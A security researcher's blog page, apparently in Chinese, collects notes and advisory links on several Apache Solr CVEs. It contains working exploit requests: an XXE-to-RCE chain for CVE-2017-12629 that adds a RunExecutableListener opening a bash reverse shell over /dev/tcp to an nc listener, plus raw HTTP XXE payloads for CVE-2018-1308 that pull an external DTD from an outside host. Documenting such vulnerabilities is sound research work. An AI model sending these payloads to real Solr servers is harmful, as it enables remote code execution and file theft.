@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="陛下，您真是一位老太太">
+    <meta name="keyword"  content="undefined">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Apache Solr漏洞合集 - caiqiqi
+        
+    </title>
+
+    <link rel="canonical" href="https://github.com/caiqiqi/2019/11/03/Apache-Solr漏洞合集/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="http://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">caiqiqi</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
+                          <a class="tag" href="/tags/#Solr" title="Solr">Solr</a>
+                        
+                    </div>
+                    <h1>Apache Solr漏洞合集</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by nobody from nowhere on
+                        2019-11-03
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>到<a href="https://cwiki.apache.org/confluence/display/solr/SolrSecurity" target="_blank" rel="external">Solr的官方安全通告页面</a>看看近三年主要有这么几个漏洞：<br><img src="https://img-blog.csdnimg.cn/20190827163237999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="CVE-2019-0193"><a href="#CVE-2019-0193" class="headerlink" title="CVE-2019-0193"></a><a href="https://issues.apache.org/jira/browse/SOLR-13669" target="_blank" rel="external">CVE-2019-0193</a></h3><p>dataConfig参数可包含脚本，而且可通过HTTP请求指定，然后通过脚本转换器转换后执行任意js-&gt;java代码。<br>已分析：<br><a href="https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA" target="_blank" rel="external">https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA</a></p>
+<p>注意需要将dataimporthandler驱动放到<code>WEB-INF/lib</code>目录下<br>若出现以下错误：原因是未能找到dataimporthandler类名，<br><img src="https://img-blog.csdnimg.cn/20190828102715371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要将jar包复制到<code>WEB-INF/lib</code>目录下。<br><img src="https://img-blog.csdnimg.cn/20190828102839194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="CVE-2019-0192"><a href="#CVE-2019-0192" class="headerlink" title="CVE-2019-0192"></a><a href="https://issues.apache.org/jira/browse/SOLR-13301" target="_blank" rel="external">CVE-2019-0192</a></h3><p>反序列化漏洞，待分析：<br><a href="https://blog.csdn.net/caiqiiqi/article/details/88431504" target="_blank" rel="external">https://blog.csdn.net/caiqiiqi/article/details/88431504</a></p>
+<h3 id="CVE-2018-8026"><a href="#CVE-2018-8026" class="headerlink" title="CVE-2018-8026"></a><a href="https://issues.apache.org/jira/browse/SOLR-12450" target="_blank" rel="external">CVE-2018-8026</a></h3><p>（这个没有在Solr的官方安全公告里出现，奇怪）<br>漏洞公告及详细描述：<br><a href="https://mail-archives.apache.org/mod_mbox/lucene-solr-user/201807.mbox/%3C0cdc01d413b7%24f97ba580%24ec72f080%24%40apache.org%3E" target="_blank" rel="external">https://mail-archives.apache.org/mod_mbox/lucene-solr-user/201807.mbox/%3C0cdc01d413b7%24f97ba580%24ec72f080%24%40apache.org%3E</a><br>复现参考：<br><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="external">https://xz.aliyun.com/t/2448</a><br>需要SolrCloud部署方式（Solr4.0版本以后基于Solr和Zookeeper的分布式搜索方案）<br>参考Solr中文文档：<a href="https://www.w3cschool.cn/solr_doc/solr_doc-5sqm2jw0.html" target="_blank" rel="external">https://www.w3cschool.cn/solr_doc/solr_doc-5sqm2jw0.html</a></p>
+<h3 id="CVE-2018-8010"><a href="#CVE-2018-8010" class="headerlink" title="CVE-2018-8010"></a><a href="https://issues.apache.org/jira/browse/SOLR-12316" target="_blank" rel="external">CVE-2018-8010</a></h3><h3 id="CVE-2018-1308"><a href="#CVE-2018-1308" class="headerlink" title="CVE-2018-1308"></a><a href="https://issues.apache.org/jira/browse/SOLR-11971" target="_blank" rel="external">CVE-2018-1308</a></h3><p>之前有一个XXE漏洞： <a href="https://issues.apache.org/jira/browse/SOLR-11971" target="_blank" rel="external">CVE-2018-1308</a><br>也是出在<br><code>DataImportHandler</code>可以 接收用户提供的xml作为配置文件。与CVE-2019-0193不同的是，这里只是引入外部实体，导致读取文件。<br>这里的缓解措施也只能是在配置文件solrconfig.xml中禁用掉data import handler功能。<br><img src="https://img-blog.csdnimg.cn/20190827160115481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>原文：<a href="https://seclists.org/oss-sec/2018/q2/22" target="_blank" rel="external">https://seclists.org/oss-sec/2018/q2/22</a><br>不过这个的修复方式是在<code>org/apache/solr/handler/dataimport/DataImporter.java</code><br>参考：<a href="https://issues.apache.org/jira/secure/attachment/12910207/SOLR-11971.patch" target="_blank" rel="external">https://issues.apache.org/jira/secure/attachment/12910207/SOLR-11971.patch</a><br><a href="https://github.com/apache/lucene-solr/commit/02c693f3713add1b4891cbaa87127de3a55c10f7">https://github.com/apache/lucene-solr/commit/02c693f3713add1b4891cbaa87127de3a55c10f7</a><br>麦香的漏洞分析报告？：<br><a href="https://issues.apache.org/jira/secure/attachment/12910190/ApacheSolrDIH-XXE.pdf" target="_blank" rel="external">https://issues.apache.org/jira/secure/attachment/12910190/ApacheSolrDIH-XXE.pdf</a></p>
+<p>读取部分文件的漏洞演示（不能读取内容开头为#的文件）：<br><a href="https://github.com/shadowsock5/notes/blob/master/payloads.md">https://github.com/shadowsock5/notes/blob/master/payloads.md</a></p>
+<h3 id="CVE-2017-12629"><a href="#CVE-2017-12629" class="headerlink" title="CVE-2017-12629"></a>CVE-2017-12629</h3><p>这个CVE包含两个漏洞，一个XXE，一个RCE。<br>想要RCE，需要以下步骤：<br>1、先通过XXE创建一个新的collection（如果已经知道可用的collection的名字了就不需要这一步了）；<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://localhost:8983/solr/gettingstarted/select?q=&#123;!xmlparser</div><div class="line">v='&lt;!DOCTYPE a SYSTEM "</div><div class="line">http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=newcollection&amp;numShards=2</div><div class="line">"&gt;&lt;a&gt;&lt;/a&gt;'&#125;</div></pre></td></tr></table></figure></p>
+<p>2、本地nc监听：<code>nc -lv 4444</code><br>3、通过XXE添加一个<code>RunExecutableListener</code></p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://localhost:8983/solr/newcollection/select?q=&#123;!xmlparser</div><div class="line">v='&lt;!DOCTYPE a SYSTEM "</div><div class="line">http://localhost:8983/solr/newcollection/select?q=xxx&amp;qt=/solr/newcollection/config?stream.body=&#123;</div><div class="line">"add-listener":&#123;"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c","$@|sh",".","echo","/bin/bash","-i","&gt;&amp;","/dev/tcp/</div><div class="line">127.0.0.1/1234","0&gt;&amp;1"]&#125;&#125;&amp;shards=localhost:8983/"&gt;&lt;a&gt;&lt;/a&gt;'&#125;</div></pre></td></tr></table></figure>
+<p>4、update这个newcollection：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://localhost:8983/solr/newcollection/select?q=&#123;!xmlparser</div><div class="line">v='&lt;!DOCTYPE a SYSTEM "</div><div class="line">http://localhost:8983/solr/newcollection/update?stream.body=[&#123;</div><div class="line">"id":"AAA"&#125;]&amp;commit=true&amp;overwrite=true"&gt;&lt;a&gt;&lt;/a&gt;'&#125;</div></pre></td></tr></table></figure>
+<p>5、然后就能在nc上收到反弹回来的shell了。</p>
+<p>邮件列表：<br><a href="http://mail-archives.us.apache.org/mod_mbox/www-announce/201710.mbox/%3CCAOOKt51UO_6Vy%3Dj8W%3Dx1pMbLW9VJfZyFWz7pAnXJC_OAdSZubA%40mail.gmail.com%3E" target="_blank" rel="external">http://mail-archives.us.apache.org/mod_mbox/www-announce/201710.mbox/%3CCAOOKt51UO_6Vy%3Dj8W%3Dx1pMbLW9VJfZyFWz7pAnXJC_OAdSZubA%40mail.gmail.com%3E</a><br>漏洞详细描述（带详细PoC）：<br><a href="http://mail-archives.apache.org/mod_mbox/lucene-dev/201710.mbox/%3CCAJEmKoC%2BeQdP-E6BKBVDaR_43fRs1A-hOLO3JYuemmUcr1R%2BTA%40mail.gmail.com%3E" target="_blank" rel="external">http://mail-archives.apache.org/mod_mbox/lucene-dev/201710.mbox/%3CCAJEmKoC%2BeQdP-E6BKBVDaR_43fRs1A-hOLO3JYuemmUcr1R%2BTA%40mail.gmail.com%3E</a></p>
+<p>分析参考：<br><a href="http://reverse-tcp.xyz/java/code%20audit/2017/10/24/CVE-2017-12629-Apache-Solr-XXE-&amp;-RCE-Analysis.html" target="_blank" rel="external">http://reverse-tcp.xyz/java/code%20audit/2017/10/24/CVE-2017-12629-Apache-Solr-XXE-&amp;-RCE-Analysis.html</a></p>
+<h3 id="CVE-2017-3164"><a href="#CVE-2017-3164" class="headerlink" title="CVE-2017-3164"></a>CVE-2017-3164</h3><p><code>shards</code>参数的SSRF，可指定任意url，然后返回响应。<br>参考：<br><a href="https://issues.apache.org/jira/browse/SOLR-12770" target="_blank" rel="external">https://issues.apache.org/jira/browse/SOLR-12770</a></p>
+<h3 id="CVE-2017-3163"><a href="#CVE-2017-3163" class="headerlink" title="CVE-2017-3163"></a>CVE-2017-3163</h3><p><a href="https://issues.apache.org/jira/browse/SOLR-10031" target="_blank" rel="external">https://issues.apache.org/jira/browse/SOLR-10031</a></p>
+<h3 id="CVE-2018-1308-1"><a href="#CVE-2018-1308-1" class="headerlink" title="CVE-2018-1308"></a>CVE-2018-1308</h3><p>官方公告：<br><a href="https://issues.apache.org/jira/browse/SOLR-11971" target="_blank" rel="external">https://issues.apache.org/jira/browse/SOLR-11971</a></p>
+<p>参考：<br><a href="https://issues.apache.org/jira/secure/attachment/12910190/ApacheSolrDIH-XXE.pdf" target="_blank" rel="external">https://issues.apache.org/jira/secure/attachment/12910190/ApacheSolrDIH-XXE.pdf</a></p>
+<p>若使用未经url编码的payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/solr/new_core/dataimport</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: 192.168.170.139:8983</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"><span class="attribute">Content-Length</span>: 181</div><div class="line"></div><div class="line"><span class="xml">command=full-import&amp;dataConfig=</span></div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://xxe.431f7f138d1960f2212d.d.zhack.ca/ftp_xxe.xml"&gt;%remote;]&gt;</span></div></pre></td></tr></table></figure>
+<p>则出现这样的错误：<br><img src="https://note.youdao.com/yws/public/resource/17746f7c265f5f39cec58116615f591c/xmlnote/WEBRESOURCE4be58fef41797c07b9988cf6bc1f9155/7818" alt=""></p>
+<p>经过url编码之后的payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/solr/new_core/dataimport</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: 192.168.170.139:8983</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"><span class="attribute">Content-Length</span>: 208</div><div class="line"></div><div class="line"><span class="bash"><span class="built_in">command</span>=full-import&amp;dataConfig=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E</span></div><div class="line">%3C!DOCTYPE+root+%5B%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2F127.0.0.1:7777%2Fftp_xxe.xml%22%3E%25remote%3B%5D%3E</div></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/17746f7c265f5f39cec58116615f591c/xmlnote/WEBRESOURCE16fee3a147ea781204c7bcc2288dbe97/7829" alt=""></p>
+<p>实现了SSRF。<br>想要实现任意文件读取，还需要一些额外的步骤。</p>
+<p>需要用到<code>com.sun.org.apache.xerces.internal.parsers</code>：<br><img src="https://note.youdao.com/yws/public/resource/17746f7c265f5f39cec58116615f591c/xmlnote/WEBRESOURCE6a25c5701034875b3ddce6c78169e72f/7840" alt=""></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><p><a href="https://github.com/artsploit/solr-injection/">Apache Solr 高危漏洞分析集合（非常好的Solr学习资料）</a></p>
+</li>
+<li><p><a href="https://raw.githubusercontent.com/artsploit/solr-injection/master/slides/DEFCON-27-Michael-Stepankin-Apache-Solr-Injection.pdf" target="_blank" rel="external">DEFCONF 27关于Solr漏洞合集的PPT</a></p>
+</li>
+</ul>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/11/03/Atlassian-Jira漏洞大杂烩/" data-toggle="tooltip" data-placement="top" title="Atlassian Jira漏洞大杂烩">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/11/03/Apache-Solr模板注入漏洞-CVE-2019-XXXX/" data-toggle="tooltip" data-placement="top" title="Apache Solr模板注入漏洞(CVE-2019-XXXX)">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Java" title="Java">Java</a>
+                        
+                          <a class="tag" href="/tags/#Solr" title="Solr">Solr</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/2963784630">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/caiqiqi">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; caiqiqi 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://github.com/caiqiqi/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
